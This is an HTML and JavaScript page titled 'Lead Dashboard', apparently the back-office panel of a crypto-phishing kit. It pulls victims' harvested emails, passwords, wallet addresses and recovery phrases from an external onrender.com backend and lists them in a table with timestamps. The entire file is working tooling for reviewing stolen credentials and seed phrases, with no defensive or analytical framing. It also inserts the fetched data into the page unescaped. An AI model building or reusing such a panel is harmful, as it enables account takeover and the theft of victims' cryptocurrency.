<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Lead Dashboard</title>
    <style>
        body { font-family: sans-serif; background: #f4f7f9; padding: 20px; }
        table { width: 100%; border-collapse: collapse; background: white; }
        th, td { padding: 10px; border: 1px solid #ddd; text-align: left; }
        th { background: #0052ff; color: white; }
    </style>
</head>
<body>
    <h1>Collected Leads</h1>
    <table id="leadsTable">
        <thead>
            <tr>
                <th>Email</th>
                <th>Password</th>
                <th>Wallet/Phrase</th>
                <th>Time</th>
            </tr>
        </thead>
        <tbody id="leadsBody"></tbody>
    </table>

    <script>
        async function loadLeads() {
            try {
                const res = await fetch('https://cb-backend-new.onrender.com/dashboard');
                const data = await res.json();
                const body = document.getElementById('leadsBody');
                body.innerHTML = ''; 
                data.forEach(lead => {
                    const row = `<tr>
                        <td>${lead.email || 'N/A'}</td>
                        <td>${lead.password || 'N/A'}</td>
                        <td>${lead.walletAddress || lead.recoveryPhrase || 'N/A'}</td>
                        <td>${new Date(lead.timestamp).toLocaleString()}</td>
                    </tr>`;
                    body.innerHTML += row;
                });
            } catch (e) {
                console.error(e);
                document.getElementById('leadsBody').innerHTML = '<tr><td colspan="4">Error loading leads.</td></tr>';
            }
        }
        loadLeads();
    </script>
</body>
</html>
